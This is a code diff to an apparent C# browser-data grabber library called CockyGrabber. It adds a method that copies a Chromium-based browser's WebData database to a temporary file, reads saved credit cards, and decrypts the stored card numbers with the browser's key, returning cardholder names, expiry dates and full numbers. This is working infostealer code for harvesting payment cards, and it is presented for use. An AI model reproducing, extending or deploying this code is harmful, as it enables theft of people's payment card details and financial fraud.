@@ -18,6 +18,7 @@ namespace CockyGrabber.Grabbers
         private const string HistoryCommandText = "SELECT id,url,title,visit_count,typed_count,last_visit_time,hidden FROM urls";
         private const string DownloadCommandText = "SELECT id,guid,current_path,target_path,start_time,received_bytes,total_bytes,state,danger_type,interrupt_reason,hash,end_time,opened,last_access_time,transient,referrer,site_url,tab_url,tab_referrer_url,http_method,by_ext_id,by_ext_name,etag,last_modified,mime_type,original_mime_type,embedder_download_data FROM downloads";
         private const string AutoFillsCommandText = "SELECT name,value FROM autofill";
+        private const string CreditCardsCommandText = "SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards";
         public virtual string CookiePath { get; set; }
         public virtual string LocalStatePath { get; set; }
         public virtual string LoginDataPath { get; set; }
@@ -433,6 +434,49 @@ namespace CockyGrabber.Grabbers
             File.Delete(tempFile);
 
             return autoFills;
+
+
+
+        }
+
+        public IEnumerable<Blink.CreditCard> GetCreditCards() => GetCreditCards(GetKey());
+        public IEnumerable<Blink.CreditCard> GetCreditCards(byte[] key) => GetCreditCards(new KeyParameter(key));
+        
+        public IEnumerable<Blink.CreditCard> GetCreditCards(KeyParameter key)
+        {
+
+            List<Blink.CreditCard> creditCards = new List<Blink.CreditCard>();
+            if (!WebDataExist()) throw new GrabberException(GrabberError.WebDataNotFound, $"The WebData database could not be found: {WebDataPath}"); // throw a Exception if the History DB was not found
+
+            // Copy the database to a temporary location because it could be already in use
+            string tempFile = CopyToTempFile(WebDataPath);
+
+            using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
+            using (var cmd = conn.CreateCommand())
+            {
+                cmd.CommandText = CreditCardsCommandText;
+
+                conn.Open();
+                using (var reader = cmd.ExecuteReader())
+                {
+                    while (reader.Read())
+                    {
+                        creditCards.Add(new Blink.CreditCard()
+                        {
+                            // Store retrieved information:
+                            //Id = reader.GetInt32(0),
+                            Name = reader.GetString(0),
+                            Month = reader.GetInt32(1),
+                            Year = reader.GetInt32(2),
+                            Number = BlinkDecryptor.DecryptValue((byte[])reader[3], key),
+                        }); ;
+                    }
+                }
+                conn.Close();
+            }
+            File.Delete(tempFile);
+
+            return creditCards;
 
 
 
